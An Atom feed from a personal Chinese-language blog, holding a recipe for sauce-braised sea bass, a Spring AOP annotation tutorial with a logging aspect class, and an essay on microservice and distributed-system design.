<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>f10@t&#39;s blog</title>
  
  <subtitle>St@y HuNgRy, St@y f00l1sh.</subtitle>
  <link href="https://lzwgiter.github.io/atom.xml" rel="self"/>
  
  <link href="https://lzwgiter.github.io/"/>
  <updated>2024-02-11T04:11:43.662Z</updated>
  <id>https://lzwgiter.github.io/</id>
  
  <author>
    <name>f10@t</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>学鲁菜之酱焖鲈鱼</title>
    <link href="https://lzwgiter.github.io/posts/21f893eb.html"/>
    <id>https://lzwgiter.github.io/posts/21f893eb.html</id>
    <published>2024-02-06T13:17:17.000Z</published>
    <updated>2024-02-11T04:11:43.662Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><img src="/img/学鲁菜之酱焖鲈鱼/image-20240211111343954.png" /></p></blockquote><span id="more"></span><h1 id="酱焖鲈鱼">酱焖鲈鱼</h1><p>这个菜属于鲁菜酱焖技法，酱香味很浓，个人感觉很好吃遂记录一下。</p><p>首先需要鲁菜中常用的两个材料，<strong>花椒油</strong>和<strong>葱椒料酒</strong>，下面首先记录这两个材料的制作方法，最后记录一下酱焖鲈鱼的流程。</p><h2 id="花椒油制作方法">花椒油制作方法</h2><p>材料：</p><ul><li>生姜</li><li>洋葱</li><li>大葱</li><li>干花椒（最好是新鲜的红皮的，放久的发乌黑的不推荐</li><li>料酒</li><li>花生油</li><li>香油</li></ul><p><strong>需要注意的重点：</strong></p><ul><li><strong>炸至焦黄即可，但不能发黑，葱发黑会导致苦味</strong></li><li><strong>凉油起锅</strong></li></ul><p>配比：洋葱：大葱为1比2，生姜些许即可；香油：花生油为1比2。</p><p>首先，使用料酒浸泡干花椒2-3小时备用：</p><p><img src="/img/学鲁菜之酱焖鲈鱼/image-20240206213325192.png" style="zoom:50%;" /></p><p>然后将葱白和葱叶切大段并从中间划开；生姜切为片状；洋葱正常切；备料如下：</p><p><img src="/img/学鲁菜之酱焖鲈鱼/image-20240206213455957.png" /></p><p>最后，锅中倒入花生油、香油，<strong>重点：凉油起锅，即油凉的状态下直接将上述备料倒入锅中：</strong></p><p><img src="/img/学鲁菜之酱焖鲈鱼/image-20240206213616449.png" style="zoom:50%;" /></p><p>开小火，慢慢加热，直至<strong>葱脱水发黄即可，主要看颜色状态，无需在意时间。最终状态如下：</strong></p><p><img src="/img/学鲁菜之酱焖鲈鱼/image-20240206213726959.png" style="zoom:50%;" /></p><p>将锅中菜等捞出滤干，此时得到的就是花椒油。</p><p>这个油在鲁菜中可以用于制作所有颜色深的菜（使用了酱油），如酱焖技法系列等，而对于颜色浅的的菜以及扒菜系列，通常使用的是<strong>葱油</strong>，也是鲁菜中另一种常用的油。</p><h2 id="葱椒料酒">葱椒料酒</h2><p>材料：</p><ul><li>大葱</li><li>花椒面</li><li>料酒</li></ul><p><strong>需要注意的重点：</strong></p><ul><li><strong>一定使用生花椒面，或者自己将生花椒碾成粉面。不可使用熟花椒</strong></li></ul><p>分为两步，做葱椒泥、加料酒。</p><p>首先，将料酒倒入花椒面中，混合为泥状。然后，大葱分段划开，切成细末，倒入上述备料，然后使用<strong>摇切方法</strong>切为泥状，得到葱椒泥。葱椒泥本身也是一种<strong>调味品</strong>，可以在鲁菜的如清汤中使用。</p><p><img src="/img/学鲁菜之酱焖鲈鱼/image-20240211114209200.png" style="zoom: 67%;" /></p><p>最后倒入些许料酒，就得到了葱椒料酒：（这里感觉我葱弄多了）</p><p><img src="/img/学鲁菜之酱焖鲈鱼/image-20240211114225571.png" style="zoom:67%;" /></p><h2 id="酱焖鲈鱼做法">酱焖鲈鱼做法</h2><p>材料：</p><ul><li>辅料：葱椒料酒、花椒油、葱姜蒜片、白芷一片、八角一颗、干花椒</li><li>调味：盐、白糖、鸡精、生抽、老抽</li><li>鲈鱼</li><li>甜面酱</li><li>淀粉（红薯、土豆的都可以）</li></ul><p><strong>需要注意的重点：</strong></p><ul><li><strong>飞酱过程中一定要把酱飞“熟”，即甜面酱由团状散开来，表面没有什么水汽，可以问到酱香味</strong></li><li><strong>出锅一定要淋上花椒油</strong></li><li><strong>闷制过程中，一定要把汤汁闷到少量，这样才能入味，出来的鱼肉不应当是白色的。</strong></li></ul><p>首先，鲈鱼改花刀，采用柳叶宽度切法，45°入刀，切至骨头：</p><p><img src="/img/学鲁菜之酱焖鲈鱼/image-20240211115001920.png" /></p><p>使用少许生抽涂抹在鱼身上，起到初步上色作用；然后拍少许淀粉，实现油炸时防粘连的作用：</p><p><img src="/img/学鲁菜之酱焖鲈鱼/image-20240211115118133.png" /></p><p>起锅烧油，用量不用太多，主要是以"煎"的方式将鱼两面炸至金黄色即可：</p><p><img src="/img/学鲁菜之酱焖鲈鱼/image-20240211115249462.png" /></p><p>如下图颜色，差不多即可：</p><p><img src="/img/学鲁菜之酱焖鲈鱼/image-20240211115317458.png" /></p><p>将炸过鱼的油倒出备用，鱼也装盘备用。另起锅烧油，放入切好的葱姜蒜片、花椒、白芷、八角：</p><p><img src="/img/学鲁菜之酱焖鲈鱼/image-20240211115541779.png" style="zoom:82%;" /></p><p><img src="/img/学鲁菜之酱焖鲈鱼/image-20240211115606853.png" style="zoom:74%;" /></p><p>炒到葱发黄，此时倒入大量甜面酱进行飞酱，待飞酱结束后，倒入少许生抽，放入一些葱椒料酒（包含料酒和葱椒泥），并加入大量的水，准备焖鱼：</p><p><img src="/img/学鲁菜之酱焖鲈鱼/image-20240211115641800.png" style="zoom:67%;" /></p><p>将鱼放入锅中：</p><p><img src="/img/学鲁菜之酱焖鲈鱼/image-20240211115834986.png" style="zoom:67%;" /></p><p>尽量让鱼都埋在汤中，盖上锅盖，焖至大约20-30分钟，<strong>个人理解这个时间只是一个参考，具体要看汤的多少，焖到最后汤是很少的。</strong>在焖制过程中，时间过半需要翻一下面，保证入味充分。</p><p>加入糖3克左右。对于盐，可以尝一下汤的味道，如果比较淡，可以看口味加入少许盐进行调味（无需太多，因为甜面酱中已有盐成分）；同时，如果觉得颜色比较淡，也可以加入少许老抽进行调色。</p><p>大约20分钟后，使用过滤网将锅中的调料、葱姜蒜片等打捞出来，保证出盘好看。</p><p>待汤汁<strong>收</strong>到少量后，倒入半勺的水淀粉，起到勾芡增稠作用；然后放入鸡精少许，起到增鲜作用。最后，淋大量的花椒油，起到增香、增亮的作用。</p><p>出盘！香的一批我只能说：</p><p><img src="/img/学鲁菜之酱焖鲈鱼/image-20240211120311642.png" style="zoom:67%;" /></p><h1 id="参考学习">参考学习</h1><ul><li><ahref="https://www.bilibili.com/video/BV1TY41117EX/?share_source=copy_web&amp;vd_source=ca529de6ffd1f1139eeee0caf4268a9d">【酱焖鲈鱼】在家中做出百年老馆子的味道，就靠一勺甜面酱</a></li><li><ahref="https://www.bilibili.com/video/BV1JQ4y1q7BJ/?share_source=copy_web&amp;vd_source=ca529de6ffd1f1139eeee0caf4268a9d">【花（葱）椒油】烧菜必备的底油，很多都做的太复杂了，今天学会炒菜的开挂秘籍。</a></li></ul><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;img src=&quot;/img/学鲁菜之酱焖鲈鱼/image-20240211111343954.png&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="日常" scheme="https://lzwgiter.github.io/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>Spring AOP再探</title>
    <link href="https://lzwgiter.github.io/posts/33ea2108.html"/>
    <id>https://lzwgiter.github.io/posts/33ea2108.html</id>
    <published>2023-10-22T12:23:10.000Z</published>
    <updated>2023-10-24T03:37:48.421Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>在学习Spring Framework的时候接触过AOP的相关内容—&gt;<ahref="https://www.f10at.cn/posts/a9e6a25b.html">Spring基础学习 - AOP机制· f10@t's blog (f10at.cn)</a>。</p><p>但是当时没有记录使用注解的方式，且仅学习了<em>Advisor</em>没有了解其与<em>Aspect</em>的联系和区别，遂补一个坑。</p><figure><img src="/img/Spring-AOP再探/1697977881563.jpg"alt="喜欢我昆明池吗？" /><figcaption aria-hidden="true">喜欢我昆明池吗？</figcaption></figure></blockquote><span id="more"></span><h1 id="基于注解编写切面">基于注解编写切面</h1><p>其实整个过程还是比较简单的，可以先入为主参考如下代码，其中定义了所有的五类通知类型。其他代码此处省略。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> lzw.spring.springreview.aspect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.extern.log4j.Log4j2;</span><br><span class="line"><span class="keyword">import</span> lzw.spring.springreview.entity.People;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.JoinPoint;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.ProceedingJoinPoint;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用户服务切面</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> float311@163.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/10/22</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Log4j2</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PeopleServiceAspect</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * execution开始定义切入点</span></span><br><span class="line"><span class="comment">     * 含义：“返回值为任意类型的lzw.spring.springreview.service.impl.PeopleServiceImpl下getPeople方法，参数列表为String,Integer”</span></span><br><span class="line"><span class="comment">     * * - 任意返回值</span></span><br><span class="line"><span class="comment">     * 类的全路径</span></span><br><span class="line"><span class="comment">     * 方法名称及参数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Pointcut(value = &quot;execution(* lzw.spring.springreview.service.impl.PeopleServiceImpl.getPeople(String, Integer))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pointcutDef</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 前置通知</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> joinPoint 连接点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Before(value = &quot;pointcutDef()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">beforeGetPeople</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        log.info(joinPoint.getSignature().getName() + <span class="string">&quot; 执行前&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 后置通知</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> joinPoint</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@After(value = &quot;pointcutDef()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterGetPeople</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        log.info(joinPoint.getSignature().getName() + <span class="string">&quot; 执行后&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回通知</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> joinPoint</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> peopleToReturn</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@AfterReturning(value = &quot;pointcutDef()&quot;, returning = &quot;peopleToReturn&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterReturning</span><span class="params">(JoinPoint joinPoint, People peopleToReturn)</span> &#123;</span><br><span class="line">        log.info(joinPoint.getSignature().getName() + <span class="string">&quot;的返回值是&quot;</span> + peopleToReturn.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 异常通知</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> joinPoint</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> e</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@AfterThrowing(value = &quot;pointcutDef()&quot;, throwing = &quot;e&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterThrowing</span><span class="params">(JoinPoint joinPoint, Exception e)</span> &#123;</span><br><span class="line">        log.info(joinPoint.getSignature() + <span class="string">&quot;方法抛出异常了，异常是&quot;</span> + e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 环绕通知</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> proceedingJoinPoint</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Throwable</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Around(value = &quot;pointcutDef()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">around</span><span class="params">(ProceedingJoinPoint proceedingJoinPoint)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        log.info(proceedingJoinPoint.getSignature().getName() + <span class="string">&quot;环绕通知前&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">toReturn</span> <span class="operator">=</span> proceedingJoinPoint.proceed();</span><br><span class="line">        log.info(proceedingJoinPoint.getSignature().getName() + <span class="string">&quot;环绕通知后&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> toReturn;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接运行，从输出中就可以看到AOP的效果了：</p><p><img src="/img/Spring-AOP再探/image-20231024101705862.png" /></p><p>从运行结果可以看出这五类通知和切入点函数的<strong>相对执行顺序</strong>：</p><blockquote><p><strong>环绕通知-&gt;前置通知-&gt;返回通知-&gt;后置通知-&gt;环绕通知</strong>。而异常通知则在切入点函数抛出异常时执行。</p></blockquote><p>上述代码关键点：</p><ul><li><span class="citation"data-cites="Aspect">@Aspect</span>：代表这是一个切面定义类；</li><li><span class="citation"data-cites="Pointcut">@Pointcut</span>：定义一个切点，可以使用<code>execution</code>关键字来定义精细化的函数切入点位置；</li><li><span class="citation"data-cites="Before">@Before</span>：前置通知，<code>value</code>属性指定切点；</li><li><span class="citation"data-cites="After">@After</span>：后置通知，<code>value</code>属性指定切点；</li><li><span class="citation"data-cites="Around">@Around</span>：环绕通知，<code>value</code>属性指定切点；</li><li><span class="citation"data-cites="AfterReturning">@AfterReturning</span>：返回通知，<code>value</code>属性指定切点，<code>returning</code>属性指定返回对象变量名称；</li><li><span class="citation"data-cites="AfterThrowing">@AfterThrowing</span>：异常通知，<code>value</code>属性指定切点，<code>throwing</code>属性指定异常变量名称；</li></ul><p>因而在使用SpringAOP时，我们针对需要切面编程的服务单元编写一个切面，其中可以定义多个<code>@Pointcut</code>注解的函数并配合<code>execution</code>表达式实现精细化的切点定义，然后针对这些切点定义不同的通知类型。</p><p><code>exection</code>表达式的含义及上述例子中的表达式如下：</p><p><img src="/img/Spring-AOP再探/image-20231024103413393.png" /></p><blockquote><p>这里有一个区别，在之前的文章（<ahref="https://www.f10at.cn/posts/a9e6a25b.html">Spring基础学习 - AOP机制· f10@t's blog(f10at.cn)</a>）中我学习的Spring切面实际上只是Advisor，即由一个切点和一个通知组成，可以理解为一个取了特值的Aspect。如上述代码所示，可以看到实际上对于一个真正的Aspect切面，我们是可以定义多个切点和多个通知的。</p></blockquote><p>但其实Advisor也不是完全没用。个人理解在Spring中，我们也可以通过将不同Advisor注入到容器中，并根据不同需求使用ProxyFactoryBean将多个需要的Advisor组装成一个Aspect，从而提高代码的<strong>复用性</strong>。</p><h1 id="参考学习">参考学习</h1><ul><li>《Spring Boot进阶 原理、实战与面试题分析》——郑天民</li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;在学习Spring Framework的时候接触过AOP的相关内容—&amp;gt;&lt;a
href=&quot;https://www.f10at.cn/posts/a9e6a25b.html&quot;&gt;Spring基础学习 - AOP机制
· f10@t&#39;s blog (f10at.cn)&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;但是当时没有记录使用注解的方式，且仅学习了&lt;em&gt;Advisor&lt;/em&gt;没有了解其与&lt;em&gt;Aspect&lt;/em&gt;的联系和区别，遂补一个坑。&lt;/p&gt;
&lt;figure&gt;
&lt;img src=&quot;/img/Spring-AOP再探/1697977881563.jpg&quot;
alt=&quot;喜欢我昆明池吗？&quot; /&gt;
&lt;figcaption aria-hidden=&quot;true&quot;&gt;喜欢我昆明池吗？&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Java" scheme="https://lzwgiter.github.io/tags/Java/"/>
    
    <category term="Spring" scheme="https://lzwgiter.github.io/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>重新审视微服务</title>
    <link href="https://lzwgiter.github.io/posts/c41813ec.html"/>
    <id>https://lzwgiter.github.io/posts/c41813ec.html</id>
    <published>2023-10-09T05:01:36.000Z</published>
    <updated>2023-10-09T12:33:22.569Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>曾写过一篇文章<ahref="https://lzwgiter.github.io/posts/662e1cfe.html">"微服务入门-5W和微服务思想"</a>，想要搞清楚微服务是什么？来源？作用？微服务架构本质上是<strong>分布式架构</strong>，这方面我没有经验或理论基础，因此对微服务技术本身的目的和体系也是一知半解。</p><p>最近阅读了一本22年的书《分布式系统架构与开发》，作者是郑天民。基于该书的内容重新整理关于一下微服务技术及其生态的"思维导图"。</p><p><img src="/img/重新审视微服务/shanqiu.png" style="zoom:70%;" /></p></blockquote><span id="more"></span><p>讨论微服务架构本身之前，先要清晰它上层的概念——分布式系统（<em>DistributedSystem</em>）。即指：<strong>软件或硬件分布在不同的网络计算机上，彼此之间仅仅依靠消息传递进行通信和协调的系统。</strong></p><h1 id="分布式系统意义何在如何改造">分布式系统意义何在？如何改造？</h1><blockquote><p>那好端端的把他们分布在多个网络计算机上干什么？意义在哪里？</p></blockquote><p>我们平时自己写的应用，比如一个springboot应用，其涵盖了业务代码、中间件（如运行环境tomcat）等，<strong>在代码规模不大也即业务不复杂的情况下，具有：</strong></p><ul><li><strong>便于维护</strong>。没几个人参与。</li><li><strong>部署简单</strong>。比如打成jar包。</li></ul><p>但随着：</p><ul><li><strong>业务的不断扩展</strong>。比如你想要添加很多其他的功能进来，这个<strong>单块系统</strong>（MonolithSystem）就会越来越庞大，比如利用Maven，管理了大量的Module。</li><li><strong>业务结构的不断变化</strong>。以往的老旧代码会不断传下去，导致代码腐化的问题。</li><li><strong>产品用户量的不断增加</strong>。如请求量不断增大，导致系统可伸缩性无法满足的问题。</li></ul><p>拿着针对上述的三个问题，我们此时就需要将单块系统改造为分布式系统，从而解决上述问题。</p><blockquote><p>怎么改？有指导思路依据吗？</p></blockquote><p>方法——<strong>系统拆分</strong>。怎么拆？——<strong>纵向拆分</strong>和<strong>横向拆分</strong>。区别？</p><p>假设我们有一个商城系统，涵括诸多业务如商品下单业务等。这两种不同思路怎么分？</p><ul><li><p>纵向拆分关注<strong>业务</strong>，将一个大应用拆分为多个小应用，如果新业务较为独立，则可以直接设计部署为一个单独的应用系统。如下图，将一个<strong>内聚度较高</strong>的业务<strong>剥离</strong>以形成不同的子系统。</p><p><img src="/img/重新审视微服务/image-20231009161352389.png" style="zoom:70%;" /></p></li><li><p>横向拆分关注<strong>技术</strong>，将可以<strong>复用</strong>的业务拆分出来并独立部署为分布式服务，其他新业务可以直接调用这些分布式服务完成构建。很像轮子的思路，如下图：</p><p><img src="/img/重新审视微服务/image-20231009181023002.png" style="zoom:70%;" /></p></li></ul><p>因而纵向拆分要点是识别<strong>内聚度高</strong>的业务；而横向拆分的要点是识别<strong>可复用</strong>的业务。</p><blockquote><p>那这么一拆就算改造好了吗？</p></blockquote><p>事情没有想象的那么好。</p><p>分布式系统区别于单块系统的最大特点，即是引入了<strong>网络通信</strong>的部分。</p><p>毕竟单块应用都是在本地来回调用的，不存在这部分的内容。那么这样的特点带来的问题或挑战是什么呢？</p><ul><li><strong>网络通信三态性</strong>。因为网络通信的结果存在三种可能：<strong>成功、失败、超时</strong>。要分别处理对应情况。</li><li><strong>请求的容错性</strong>。拆分后，你的某一个服务由于比如断电了，<strong>不可用了怎么办</strong>？上层业务就无法使用该业务了。</li><li><strong>系统的异构性</strong>。由于部署在不同的机器上，存在网络不同、操作系统不同、技术体系不同的问题，这可能就导致了开发过程中存在诸多不便。那<strong>如何实现一种通用的服务集成和交互方式来屏蔽掉上述差异呢？</strong></li><li><strong>数据的一致性</strong>。假设多个相同的服务运行在不同的机器上，由于网络异常出现了网络分区的问题，此时总不能这个服务说用户A还有5块钱，那个服务说是4块钱吧？即<strong>如何在数据被分散或复制到不同机器上时、确保各台主机之间数据的一致性？</strong></li></ul><p>因而在对单块系统改造的时候，我们还需要考虑上述问题。</p><h1 id="微服务架构特点">微服务架构特点</h1><blockquote><p>那它和传统分布式架构区别在哪里？</p></blockquote><p>在上述传统分布式架构的<strong>四个特性</strong>的基础上，微服务架构还提倡服务的组件化，且组件之间尽可能使用如RESTful的轻量级通信方式进行服务集成，确保技术无关性。而不是采用一些私有化协议和重量级通信方式。</p><p>Martin Flowler指出，微服务架构特点如下：</p><ul><li>服务组件化。即实现服务的独立部署，假设应用由多个不同组件组成，那么<strong>只需要重新部署那个改变了的服务就可以完成替换或升级。</strong></li><li>按业务能力组织服务。研发团队划分时，倾向于<strong>围绕业务功能</strong>的组织分割出<strong>特征团队</strong>，而不是按照技术来划分（如App前端、服务器端等<strong>职能团队</strong>）。这样的特征团队是跨职能的，具备多项技能如用户体验、项目管理、技术开发等。</li><li>去中心化。技术上，将组件拆分为不同服务，<strong>各自可以选择适合的语言、工具</strong>；数据上，对数据进行分散管理，<strong>每个微服务管理自己的数据库。</strong></li><li>基础设施自动化。除了CI/CD，也要依赖基础设施自动化技术，比如Vagrant，通过编写yaml文件，就可以自动化的生成一个虚拟机了。</li></ul><blockquote><p>既然有上述特点，如何设计微服务架构呢？有理论指导吗？</p></blockquote><p>首要切入点——<strong>服务建模</strong>。方法？——领域驱动设计（<em>DomainDriven Design</em>）。（ps：这部分内容我还一直没有学习。</p><h1id="微服务系统核心设计要求以及对应技术开发组件">微服务系统核心设计要求以及对应技术开发组件</h1><p>讨论技术开发组件之前，先要明确需求或设计要求，<strong>知其所然而所以然</strong>。</p><h2 id="核心设计要求">核心设计要求</h2><p>一共分为四点，<strong>性能、可用性、可扩展性和服务治理</strong>。我将一一列举其含义、面临的挑战和解决意义。</p><blockquote><p>性能，如何衡量？哪些指标？</p></blockquote><p>性能的具体表现有两方面：<strong>当前承载体量下的执行能力</strong>和<strong>未来流量变化时的弹性处理能力</strong>。具体衡量指标如：</p><ul><li>响应时间</li><li>系统吞吐量</li><li>架构的可伸缩性</li><li>性能问题</li><li>峰值负载</li></ul><blockquote><p>可用性，什么意思？有什么意义吗？如何确保？</p></blockquote><p>可用性指在业务需要时能够完整提供服务并有效处理影响其可用性的故障的能力。</p><p>一些常见事件如系统升级、停机、维修、备份、灾难恢复等，都会对服务产生一些影响，因而需要对应的实施计划。</p><p>具体方法如使用容错硬件、容错软件、引入服务的<strong>降级和限流机制</strong>、确保采用主流的集群和负载均衡机制（如四层、七层负载均衡）、加强日志管理和分析、采用组件复制策略等。</p><blockquote><p>可扩展性，和可伸缩是一个东西吗？有什么意义吗？如何确保？</p></blockquote><p>扩展指系统对自身灵活性及实现这种灵活性索要付出的成本进行平衡的能力。良好可扩展性意味着可以以较低的成本扩展出新的特性或业务。注意可扩展的是<strong>业务的可扩展性</strong>，区别于性能中的可伸缩性，后者指的是性能。</p><p>为了提高可扩展性可以从两方面考虑。<strong>加强产品管理</strong>，从需求源头把握变化以降低后续不必要变更；<strong>采用合理的技术方法</strong>，如采用异步消息等实现系统解耦、尽量使用SPI等业内标准技术，确保较高的可扩展性。</p><blockquote><p>服务治理，为什么要治理？怎么治理？</p></blockquote><p>对于一个微服务系统，其中可能包含了数百个服务，因而存在如下三个问题：</p><ul><li>有哪些服务在运行？</li><li>部署方式调整后，服务自身暴露状态的动态性</li><li>有多少服务在运行？什么状态？</li></ul><p>也即总结为两个挑战：</p><ul><li>服务实例的数量如何管理？</li><li>服务实例的状态如何管理？</li></ul><p>针对上述挑战，我们就需要引入服务治理的方法和工具。对<strong>每个服务实例信息进行抽象并构建一个独立的媒介</strong>来管理这些服务实例信息，且这个媒介要<strong>具备服务注册和发现机制</strong>。此外，我们还需要引入系统监控和链路跟踪等技术，确保对出现的异常情况进行及时的干预。</p><h2 id="开发技术组件">开发技术组件</h2><p>针对上述的四个要求：性能、可用性、可扩展性、服务治理，我们可以梳理为如下三类组件（图片来自原书，我增加与上述问题的提炼）：</p><p><img src="/img/重新审视微服务/image-20231009194933562.png" /></p><h1 id="后话关于服务网格技术">后话：关于服务网格技术</h1><p>上述开发技术架构虽然可以满足我们的需求、解决面临的问题，但是也存在代码侵入高的问题，如依赖文件、配置文件等，这就导致了其版本升级对业务代码存在一定影响的问题。</p><p>因而2016年国外Buoyant公司提出了服务网格（ServiceMesh）的概念，按照数据层面和<strong>控制层面</strong>进行划分，将上述组件如网络通信、负载均衡、容错等功能下沉。具体来说，基于K8s平台，数据平面上，以Sidecar方式部开源Envoy实现流量代理；控制平面上，依靠istiod对所有代理进行管理和配置。最终实现了将<strong>业务与微服务组件</strong>分离的效果，从而解决了上述问题。</p><p>业内成熟框架Istio的架构图如下所示：</p><p><img src="/img/重新审视微服务/image-20231009201623649.png" /></p><h1 id="参考学习">参考学习</h1><ul><li>《分布式系统架构与开发 技术原理与面试题解析》——郑天民</li><li><ahref="https://istio.io/latest/docs/ops/deployment/architecture/">Istio /Architecture</a></li></ul><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;曾写过一篇文章&lt;a
href=&quot;https://lzwgiter.github.io/posts/662e1cfe.html&quot;&gt;&quot;微服务入门-5W和微服务思想&quot;&lt;/a&gt;，想要搞清楚微服务是什么？来源？作用？微服务架构本质上是&lt;strong&gt;分布式架构&lt;/strong&gt;，这方面我没有经验或理论基础，因此对微服务技术本身的目的和体系也是一知半解。&lt;/p&gt;
